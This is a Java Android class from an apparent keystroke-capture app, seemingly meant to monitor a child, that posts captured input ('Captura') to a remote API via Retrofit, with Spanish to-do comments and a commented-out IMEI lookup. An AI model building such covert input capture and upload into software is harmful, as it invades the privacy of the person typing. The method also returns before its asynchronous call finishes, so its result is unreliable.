package com.example.keyboard_capture.utility;

import com.example.keyboard_capture.api.retrofit.RestApiAdapter;
import com.example.keyboard_capture.model.Captura;
import com.example.keyboard_capture.model.Hijo;

import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;

public class CapsuledCaptured {

    private Captura captura;

    public CapsuledCaptured(Captura captura) {
        this.captura = captura;
    }

    public String callPostDataCapture(){
        //Esto es horrible cambiarlo por una sola instancia -- objeto global y unico buscarlo en la arqutectura
        RestApiAdapter restApiAdapter = new RestApiAdapter();

        //Hacer inyeccion de dependencias para reutilizar el mismo objeto y no saturar la memoria con una nuva instancia.
        //imei = constants.getIMEI();
        final String[] request = {""};
        restApiAdapter
                .getClientService()
                .newCapture(captura)
                .enqueue(new Callback<Captura>() {
                    @Override
                    public void onResponse(Call<Captura> call, Response<Captura> response) {
                        request[0] = response.body().toString();
                        //Log.i(TAG,"request: " + response.body().toString() + "==> u_u");
                    }
                    @Override
                    public void onFailure(Call<Captura> call, Throwable t) {
                        //Log.i(TAG,"request: Error :(");
                        request[0] = "Fail call api";

                    }
                });

        return request[0];
    }
}
